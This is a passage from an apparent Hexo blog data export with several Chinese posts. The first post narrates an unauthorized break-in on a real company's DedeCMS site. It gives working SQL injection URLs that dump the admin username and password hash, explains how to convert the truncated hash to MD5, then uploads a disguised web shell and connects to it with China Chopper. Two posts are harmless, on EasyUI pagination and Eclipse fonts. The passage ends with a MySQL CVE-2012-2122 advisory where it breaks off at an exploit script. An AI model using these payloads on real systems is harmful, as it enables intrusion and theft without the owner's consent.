技术文章\n---\n\ndedecms 的这个漏洞已经是老漏洞了，只不过今天同学给我说他明天去面试\n\n所以就顺手给他去面试的那家公司做个安全测试，就把过程记录下来吧：\n\n首先打开目标站点：\n\n右击查看网站源代码，发现几个比较特殊的地方：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_source.png \"dede_source\")](http://asset.creturn.com/asset/uploads/2012/07/dede_source.png)\n\n可以看到根目录有a文件夹和uploads，对于dedecms熟悉的人都知道，dedecms有a和uploads/allimg目录，\n\n抱着试试的心态目标站点后面加上member看看，一般做二次开发不带会员中心的话member基本还是原因，\n\n也就能判断出目标系统：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png \"dede_cms\")](http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png)\n\n可以清楚的看到目标是dedecms系统\n<!--more-->\n那么继续看看他的最好更新时间确认下他是否是最新版本如果不是最新版本那么存在漏洞的可能性就很大了：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_var.png \"dede_var\")](http://asset.creturn.com/asset/uploads/2012/07/dede_var.png)\n\n可以看到最后一次更新时间是2011-10-15 看到这个基本能保证有可能存在漏洞。\n\ndedeCMS的默认后台大家应该都知道，目标后面加上dede，结果真出来了，其实\n\n一般情况下很少有人把dede不重命名的。\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_admin.png \"dede_admin\")](http://asset.creturn.com/asset/uploads/2012/07/dede_admin.png)\n\n默认试了下admin没有此用户\n\n网上搜下2012年以前的漏洞,找到一个注入漏洞和一个上传漏洞：\n\n既然有后台就先试试注入吧：\n\n```php\n/member/ajax_membergroup.php?action=post&amp;membergroup=@`'` Union select userid from `%23@__admin` where 1 or id=@`'`\n```\n\n这句是爆出用户名的:\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_user.png \"dede_user\")](http://asset.creturn.com/asset/uploads/2012/07/dede_user.png)\n\n```php\n/member/ajax_membergroup.php?action=post&amp;membergroup=@`'` Union select pwd from `%23@__admin` where 1 or id=@`'`\n```\n\n这个是爆密码的：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_pwd_new.png \"dede_pwd_new\")](http://asset.creturn.com/asset/uploads/2012/07/dede_pwd_new.png)\n\n可以看到加密后的密码：9951b286c1329f303e3c\n\ndedecms加密方式有是substr(md5($pwd),5,20) 也就是md5加密后取得第5位开始取20位字符为密码\n\n那么把它还原成md5的16位加密算法就是去掉头部3为和后面1为就是16为md5:1b286c1329f303e3\n\nmd5解密网站很多大家可以去找找，我是当时网站打不开就直接让群里哥们帮查的。\n\n看了下目标服务器是IIS6的那么直接就上传特殊后缀，让它解析成php吧：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_server.png \"dede_server\")](http://asset.creturn.com/asset/uploads/2012/07/dede_server.png)\n\n有了用户名，密码基本这个站点权限拿下了，后台上传一句话图马：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_up_file.png \"dede_up_file\")](http://asset.creturn.com/asset/uploads/2012/07/dede_up_file.png)\n\n传后直接菜刀连上：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/dede_caidao.png \"dede_caidao\")](http://asset.creturn.com/asset/uploads/2012/07/dede_caidao.png)\n\n互联网上的安全其实是很重要的，再次还是提醒各位coder或者安全运维，互联网安全很重要的，稍微有点马虎\n\n可能造成严重的后果。还是希望大家把安全措施做好。\n\n如需转载本文请注明来源，负责后果自负！\n","slug":"dedecms-v5-7-注入漏洞利用","updated":1421659126000,"excerpt":"<p>dedecms 的这个漏洞已经是老漏洞了，只不过今天同学给我说他明天去面试</p>\n<p>所以就顺手给他去面试的那家公司做个安全测试，就把过程记录下来吧：</p>\n<p>首先打开目标站点：</p>\n<p>右击查看网站源代码，发现几个比较特殊的地方：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_source.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_source.png\" alt=\"\" title=\"dede_source\"></a></p>\n<p>可以看到根目录有a文件夹和uploads，对于dedecms熟悉的人都知道，dedecms有a和uploads/allimg目录，</p>\n<p>抱着试试的心态目标站点后面加上member看看，一般做二次开发不带会员中心的话member基本还是原因，</p>\n<p>也就能判断出目标系统：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png\" alt=\"\" title=\"dede_cms\"></a></p>\n<p>可以清楚的看到目标是dedecms系统<br>","_id":"rof3jjexx9r8itzw","comments":true,"layout":"post","photos":[],"link":""},{"title":"EasyUi 分页实现方法","id":117,"date":1342022354000,"tags":["9gveogxdiut3wbji"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>最近项目中使用到EasyUI的前端框架,分页我想基本上没有那个项目能够离开的，</p>\n<p>结果今天悲剧的把官方文档翻了一边竟然没找到实例和说明。最终一番Google</p>\n<p>最终找到方法:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//自定义Grid分页数据表</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CreateGridPage</span><span class=\"params\">(url,feildData)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">var</span> title = arguments[<span class=\"number\">2</span>] ? arguments[<span class=\"number\">2</span>] : <span class=\"string\">'数据表格'</span>;</div><div class=\"line\"> <span class=\"keyword\">var</span> tab = arguments[<span class=\"number\">3</span>] ? arguments[<span class=\"number\">3</span>] : <span class=\"string\">'#tab'</span>;</div><div class=\"line\"> <span class=\"keyword\">var</span> id = &quot;gidi_&quot;+Math.floor(Math.random()*<span class=\"number\">1000</span>+<span class=\"number\">1</span>);</div><div class=\"line\"> $(tab).tabs(<span class=\"string\">'add'</span>,{</div><div class=\"line\"> id:id,</div><div class=\"line\"> title:title,</div><div class=\"line\"> closable:<span class=\"keyword\">true</span>,</div><div class=\"line\"> });</div><div class=\"line\"> CreateGrid(id,url,feildData,title,<span class=\"keyword\">true</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">//创建window窗口数据表格</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CreateGridWind</span><span class=\"params\">(url,feildData,width,heigth)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">var</span> id = &quot;gidi_win_&quot;+Math.floor(Math.random()*<span class=\"number\">1000</span>+<span class=\"number\">1</span>);</div><div class=\"line\"> <span class=\"keyword\">var</span> title = arguments[<span class=\"number\">4</span>] ? arguments[<span class=\"number\">4</span>] : <span class=\"string\">'数据表格'</span>;</div><div class=\"line\"> $(<span class=\"string\">'body'</span>).append(<span class=\"string\">'&lt;div id=&quot;'</span>+id+<span class=\"string\">'&quot;&gt;&lt;/div&gt;'</span>);</div><div class=\"line\"> $(<span class=\"string\">'#'</span>+id).window({</div><div class=\"line\"> title:title,</div><div class=\"line\"> width:width,</div><div class=\"line\"> height:heigth,</div><div class=\"line\"> modal:<span class=\"keyword\">true</span></div><div class=\"line\"> });</div><div class=\"line\"> CreateGrid(id,url,feildData,<span class=\"keyword\">null</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">//创建带分页的数据表格</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CreateGrid</span><span class=\"params\">(id,url,feildData,title,pagination)</span></span>{</div><div class=\"line\"> $(<span class=\"string\">'#'</span>+id).datagrid({</div><div class=\"line\"> title:title,</div><div class=\"line\"> iconCls:<span class=\"string\">'icon-save'</span>,</div><div class=\"line\"> url:url,</div><div class=\"line\"> idField:feildData.idField,</div><div class=\"line\"> singleSelect:<span class=\"keyword\">true</span>,</div><div class=\"line\"> striped:<span class=\"keyword\">true</span>,</div><div class=\"line\"> rownumbers:<span class=\"keyword\">true</span>,</div><div class=\"line\"> pagination:pagination,</div><div class=\"line\"> fitColumns:<span class=\"keyword\">true</span>,</div><div class=\"line\"> loadMsg:<span class=\"string\">'亲~ 正在努力拉取数据中...'</span>,</div><div class=\"line\"> columns:[</div><div class=\"line\"> feildData.field</div><div class=\"line\"> ]</div><div class=\"line\"> });</div><div class=\"line\"> <span class=\"keyword\">var</span> page = $(<span class=\"string\">'#'</span>+id).datagrid(<span class=\"string\">'getPager'</span>);</div><div class=\"line\"> $(page).pagination({</div><div class=\"line\"> showRefresh:<span class=\"keyword\">false</span>,</div><div class=\"line\"> beforePageText:<span class=\"string\">'第'</span>,</div><div class=\"line\"> afterPageText:<span class=\"string\">'页 共{pages}页'</span>,</div><div class=\"line\"> displayMsg:<span class=\"string\">'每页 {to} 条 总共 {total} 记录'</span>,</div><div class=\"line\"> onSelectPage:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(num,size)</span></span>{</div><div class=\"line\"> $(<span class=\"string\">'#'</span>+id).datagrid({</div><div class=\"line\"> queryParams:{</div><div class=\"line\"> page:num,</div><div class=\"line\"> size:size</div><div class=\"line\"> }</div><div class=\"line\"> });</div><div class=\"line\"> }</div><div class=\"line\"> });</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>上面代码是自己写好的两个，一个是创建在tab组件中显示Grid表格，另外一个是创建弹出window窗口中显示Grid表格<br><a id=\"more\"></a><br>注意：</p>\n<blockquote>\n<p>queryParams  参数是发送给服务的的参数，把page和size定义在这个后台就利用这个进行分页，和普通分页类似</p>\n</blockquote>\n<p>分页代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">$(page).pagination({</div><div class=\"line\">showRefresh:<span class=\"literal\">false</span>,</div><div class=\"line\">beforePageText:<span class=\"string\">'第'</span>,</div><div class=\"line\">afterPageText:<span class=\"string\">'页 共{pages}页'</span>,</div><div class=\"line\">displayMsg:<span class=\"string\">'每页 {to} 条 总共 {total} 记录'</span>,</div><div class=\"line\">onSelectPage:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(num,size)</span></span>{</div><div class=\"line\">$(<span class=\"string\">'#'</span>+id).datagrid({</div><div class=\"line\">queryParams:{</div><div class=\"line\">page:num,</div><div class=\"line\">size:size</div><div class=\"line\">}</div><div class=\"line\">});</div><div class=\"line\">}</div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n","source":"_posts/easyui-分页实现方法.md","raw":"title: \"EasyUi 分页实现方法\"\nid: 117\ndate: 2012-07-11 23:59:14\ntags: \n- easyui\ncategories: \n- 原创作品\n- 技术文章\n---\n\n最近项目中使用到EasyUI的前端框架,分页我想基本上没有那个项目能够离开的，\n\n结果今天悲剧的把官方文档翻了一边竟然没找到实例和说明。最终一番Google\n\n最终找到方法:\n\n```php\n\n//自定义Grid分页数据表\nfunction CreateGridPage(url,feildData){\n var title = arguments[2] ? arguments[2] : '数据表格';\n var tab = arguments[3] ? arguments[3] : '#tab';\n var id = &quot;gidi_&quot;+Math.floor(Math.random()*1000+1);\n $(tab).tabs('add',{\n id:id,\n title:title,\n closable:true,\n });\n CreateGrid(id,url,feildData,title,true);\n}\n//创建window窗口数据表格\nfunction CreateGridWind(url,feildData,width,heigth){\n var id = &quot;gidi_win_&quot;+Math.floor(Math.random()*1000+1);\n var title = arguments[4] ? arguments[4] : '数据表格';\n $('body').append('&lt;div id=&quot;'+id+'&quot;&gt;&lt;/div&gt;');\n $('#'+id).window({\n title:title,\n width:width,\n height:heigth,\n modal:true\n });\n CreateGrid(id,url,feildData,null);\n}\n//创建带分页的数据表格\nfunction CreateGrid(id,url,feildData,title,pagination){\n $('#'+id).datagrid({\n title:title,\n iconCls:'icon-save',\n url:url,\n idField:feildData.idField,\n singleSelect:true,\n striped:true,\n rownumbers:true,\n pagination:pagination,\n fitColumns:true,\n loadMsg:'亲~ 正在努力拉取数据中...',\n columns:[\n feildData.field\n ]\n });\n var page = $('#'+id).datagrid('getPager');\n $(page).pagination({\n showRefresh:false,\n beforePageText:'第',\n afterPageText:'页 共{pages}页',\n displayMsg:'每页 {to} 条 总共 {total} 记录',\n onSelectPage:function(num,size){\n $('#'+id).datagrid({\n queryParams:{\n page:num,\n size:size\n }\n });\n }\n });\n}\n```\n\n上面代码是自己写好的两个，一个是创建在tab组件中显示Grid表格，另外一个是创建弹出window窗口中显示Grid表格\n<!--more-->\n注意：\n\n>queryParams  参数是发送给服务的的参数，把page和size定义在这个后台就利用这个进行分页，和普通分页类似\n\n\n分页代码：\n\n```javascript\n$(page).pagination({\nshowRefresh:false,\nbeforePageText:'第',\nafterPageText:'页 共{pages}页',\ndisplayMsg:'每页 {to} 条 总共 {total} 记录',\nonSelectPage:function(num,size){\n$('#'+id).datagrid({\nqueryParams:{\npage:num,\nsize:size\n}\n});\n}\n});\n```\n","slug":"easyui-分页实现方法","updated":1421659126000,"excerpt":"<p>最近项目中使用到EasyUI的前端框架,分页我想基本上没有那个项目能够离开的，</p>\n<p>结果今天悲剧的把官方文档翻了一边竟然没找到实例和说明。最终一番Google</p>\n<p>最终找到方法:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//自定义Grid分页数据表</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CreateGridPage</span><span class=\"params\">(url,feildData)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">var</span> title = arguments[<span class=\"number\">2</span>] ? arguments[<span class=\"number\">2</span>] : <span class=\"string\">'数据表格'</span>;</div><div class=\"line\"> <span class=\"keyword\">var</span> tab = arguments[<span class=\"number\">3</span>] ? arguments[<span class=\"number\">3</span>] : <span class=\"string\">'#tab'</span>;</div><div class=\"line\"> <span class=\"keyword\">var</span> id = &quot;gidi_&quot;+Math.floor(Math.random()*<span class=\"number\">1000</span>+<span class=\"number\">1</span>);</div><div class=\"line\"> $(tab).tabs(<span class=\"string\">'add'</span>,{</div><div class=\"line\"> id:id,</div><div class=\"line\"> title:title,</div><div class=\"line\"> closable:<span class=\"keyword\">true</span>,</div><div class=\"line\"> });</div><div class=\"line\"> CreateGrid(id,url,feildData,title,<span class=\"keyword\">true</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">//创建window窗口数据表格</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CreateGridWind</span><span class=\"params\">(url,feildData,width,heigth)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">var</span> id = &quot;gidi_win_&quot;+Math.floor(Math.random()*<span class=\"number\">1000</span>+<span class=\"number\">1</span>);</div><div class=\"line\"> <span class=\"keyword\">var</span> title = arguments[<span class=\"number\">4</span>] ? arguments[<span class=\"number\">4</span>] : <span class=\"string\">'数据表格'</span>;</div><div class=\"line\"> $(<span class=\"string\">'body'</span>).append(<span class=\"string\">'&lt;div id=&quot;'</span>+id+<span class=\"string\">'&quot;&gt;&lt;/div&gt;'</span>);</div><div class=\"line\"> $(<span class=\"string\">'#'</span>+id).window({</div><div class=\"line\"> title:title,</div><div class=\"line\"> width:width,</div><div class=\"line\"> height:heigth,</div><div class=\"line\"> modal:<span class=\"keyword\">true</span></div><div class=\"line\"> });</div><div class=\"line\"> CreateGrid(id,url,feildData,<span class=\"keyword\">null</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">//创建带分页的数据表格</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CreateGrid</span><span class=\"params\">(id,url,feildData,title,pagination)</span></span>{</div><div class=\"line\"> $(<span class=\"string\">'#'</span>+id).datagrid({</div><div class=\"line\"> title:title,</div><div class=\"line\"> iconCls:<span class=\"string\">'icon-save'</span>,</div><div class=\"line\"> url:url,</div><div class=\"line\"> idField:feildData.idField,</div><div class=\"line\"> singleSelect:<span class=\"keyword\">true</span>,</div><div class=\"line\"> striped:<span class=\"keyword\">true</span>,</div><div class=\"line\"> rownumbers:<span class=\"keyword\">true</span>,</div><div class=\"line\"> pagination:pagination,</div><div class=\"line\"> fitColumns:<span class=\"keyword\">true</span>,</div><div class=\"line\"> loadMsg:<span class=\"string\">'亲~ 正在努力拉取数据中...'</span>,</div><div class=\"line\"> columns:[</div><div class=\"line\"> feildData.field</div><div class=\"line\"> ]</div><div class=\"line\"> });</div><div class=\"line\"> <span class=\"keyword\">var</span> page = $(<span class=\"string\">'#'</span>+id).datagrid(<span class=\"string\">'getPager'</span>);</div><div class=\"line\"> $(page).pagination({</div><div class=\"line\"> showRefresh:<span class=\"keyword\">false</span>,</div><div class=\"line\"> beforePageText:<span class=\"string\">'第'</span>,</div><div class=\"line\"> afterPageText:<span class=\"string\">'页 共{pages}页'</span>,</div><div class=\"line\"> displayMsg:<span class=\"string\">'每页 {to} 条 总共 {total} 记录'</span>,</div><div class=\"line\"> onSelectPage:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(num,size)</span></span>{</div><div class=\"line\"> $(<span class=\"string\">'#'</span>+id).datagrid({</div><div class=\"line\"> queryParams:{</div><div class=\"line\"> page:num,</div><div class=\"line\"> size:size</div><div class=\"line\"> }</div><div class=\"line\"> });</div><div class=\"line\"> }</div><div class=\"line\"> });</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>上面代码是自己写好的两个，一个是创建在tab组件中显示Grid表格，另外一个是创建弹出window窗口中显示Grid表格<br>","_id":"hvrqvqfvwq5yzxfl","comments":true,"layout":"post","photos":[],"link":""},{"title":"Eclipse设置Courier New字体","id":166,"date":1343497360000,"tags":["nvprrcqtka2k07j1"],"categories":["ng1ki7p1v08zbwrz"],"content":"<p>今天把之前的eclipse 3.X升级了下换成了4.2的版本，于是乎又要配置一番</p>\n<p>结果发现window7下依然不能设置字体为Courier New字体。我想做开发的</p>\n<p>同学对这个字体应该很熟悉把，写代码看着舒服，之前的3.2版本解决方法是</p>\n<p>改eclipse里面的一个jar包。具体那个还给忘记了。所以想想linux默认是可以</p>\n<p>设置CourierNew字体为啥window7下却不行？于是度娘10分钟后找到答案</p>\n<p>打开控制面板-》找到字体打开</p>\n<p>然后在字体文件夹里面找到CourierNew字体右击选择显示如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/font.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/font.jpg\" alt=\"\" title=\"font\"></a></p>\n<a id=\"more\"></a>\n\n<p>然后在打开字体设置界面看看是不是已经可以看到CourierNew的字体：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/font_1.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/font_1.jpg\" alt=\"\" title=\"font_1\"></a></p>\n<p>最后在来一张全景效果图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/font_2.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/font_2.jpg\" alt=\"\" title=\"font_2\"></a></p>\n","source":"_posts/eclipse设置courier-new字体.md","raw":"title: \"Eclipse设置Courier New字体\"\nid: 166\ndate: 2012-07-29 01:42:40\ntags: \n- eclipse\ncategories: \n- 原创作品\n---\n\n今天把之前的eclipse 3.X升级了下换成了4.2的版本，于是乎又要配置一番\n\n结果发现window7下依然不能设置字体为Courier New字体。我想做开发的\n\n同学对这个字体应该很熟悉把，写代码看着舒服，之前的3.2版本解决方法是\n\n改eclipse里面的一个jar包。具体那个还给忘记了。所以想想linux默认是可以\n\n设置CourierNew字体为啥window7下却不行？于是度娘10分钟后找到答案\n\n打开控制面板-》找到字体打开\n\n然后在字体文件夹里面找到CourierNew字体右击选择显示如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/font.jpg \"font\")](http://asset.creturn.com/asset/uploads/2012/07/font.jpg)\n\n<!--more-->\n\n然后在打开字体设置界面看看是不是已经可以看到CourierNew的字体：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/font_1.jpg \"font_1\")](http://asset.creturn.com/asset/uploads/2012/07/font_1.jpg)\n\n最后在来一张全景效果图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/font_2.jpg \"font_2\")](http://asset.creturn.com/asset/uploads/2012/07/font_2.jpg)\n","slug":"eclipse设置courier-new字体","updated":1421659126000,"excerpt":"<p>今天把之前的eclipse 3.X升级了下换成了4.2的版本，于是乎又要配置一番</p>\n<p>结果发现window7下依然不能设置字体为Courier New字体。我想做开发的</p>\n<p>同学对这个字体应该很熟悉把，写代码看着舒服，之前的3.2版本解决方法是</p>\n<p>改eclipse里面的一个jar包。具体那个还给忘记了。所以想想linux默认是可以</p>\n<p>设置CourierNew字体为啥window7下却不行？于是度娘10分钟后找到答案</p>\n<p>打开控制面板-》找到字体打开</p>\n<p>然后在字体文件夹里面找到CourierNew字体右击选择显示如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/font.jpg\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/font.jpg\" alt=\"\" title=\"font\"></a></p>\n","_id":"345egf8bl9o7knw2","comments":true,"layout":"post","photos":[],"link":""},{"title":"MySQL 概率性任意密码(身份认证)登录漏洞(CVE-2012-2122)","id":47,"date":1341116190000,"tags":["a6nwzj3n2sbkwjjl","p7c36otjetkpkpka","v5r8zb3199qf7de8"],"categories":["1bynalp69sca7b8g","n6ap4t4mi3gt91g0"],"content":"<h3 id=\"发布时间:_2012-06-11_(GMT+0800)\">发布时间: 2012-06-11 (GMT+0800)</h3>\n<h2 id=\"漏洞版本:\">漏洞版本:</h2>\n<p>MySQL &lt; 5.6.6<br>MySQL &lt; 5.5.24<br>MySQL &lt; 5.1.63<br>MariaDB &lt; 5.5.23<br>MariaDB &lt; 5.3.6<br>MariaDB &lt; 5.2.12<br>MariaDB &lt; 5.1.62</p>\n<h2 id=\"漏洞描述:\">漏洞描述:</h2>\n<p>CVE ID: CVE-2012-2122</p>\n<p>MariaDB是为MySQL提供偶然替代功能的数据库服务器。MySQL是开源数据库。</p>\n<p>MariaDB 5.1.62, 5.2.12、5.3.6、5.5.23之前版本和MySQL 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者无需知道正确口令就能登录到MySQL服务器。</p>\n<p>用户连接到MariaDB/MySQL后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MySQL/MariaDB误认为密码是正确的，因为协议使用的是随机字符串，该Bug发生的几率为1/256。MySQL的版本是否受影响取决于程序的编译方式，很多版本（包括官方提供的二进制文件）并不受此漏洞的影响。</p>\n<p>也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。而且漏洞利用工具已经出现。</p>\n<blockquote>\n<p>参考<br><a href=\"http://seclists.org/oss-sec/2012/q2/493\" target=\"_blank\" rel=\"external\">http://seclists.org/oss-sec/2012/q2/493</a></p>\n</blockquote>\n<p>测试方法:</p>\n<p>本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!<br><a id=\"more\"></a></p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div 